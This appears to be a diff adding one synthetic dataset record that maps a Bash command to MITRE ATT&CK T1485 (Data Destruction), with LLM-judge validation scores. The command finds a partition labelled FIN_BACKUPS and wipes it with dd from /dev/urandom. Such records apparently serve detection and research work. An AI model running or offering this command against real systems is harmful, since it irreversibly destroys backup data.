@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'dev=$(blkid -L FIN_BACKUPS); [ -n \"$dev\" ] && { umount \"$dev\" 2>/dev/null || true; dd if=/dev/urandom of=\"$dev\" bs=4M oflag=direct status=progress; }'",
+  "explanation": "Identifies a labeled backup partition and overwrites it with random data after unmounting.",
+  "rationale_steps": [
+    "Resolve device path by filesystem label",
+    "Ensure it is unmounted to avoid corruption during write",
+    "Overwrite the entire block device with random data",
+    "Use direct I/O for thorough, uncached writes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-3c4b6e23",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quotes and braces with proper separators; uses valid commands and flags in a well-formed bash -c string.",
+        "semantic_score": 4,
+        "semantic_justification": "Accurately locates a labeled device, attempts to unmount it, and overwrites it with random data via dd, but practical execution requires root privileges contrary to the specified 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:25:15.386034Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced braces, proper quoting, valid command separators, and correct flag usage throughout the bash -c construct.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1485 by using blkid to locate a labeled backup partition, unmounting it to ensure write access, then overwriting it entirely with /dev/urandom via dd with direct I/O flags, rendering the backup data unrecoverable.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-19T01:44:02.489325Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, including proper variable assignment, conditional execution, and correctly structured subshells and flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command logic perfectly matches the intent of identifying, unmounting, and securely wiping a specific backup partition, though it would require root privileges to execute successfully.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:44:06.040848Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
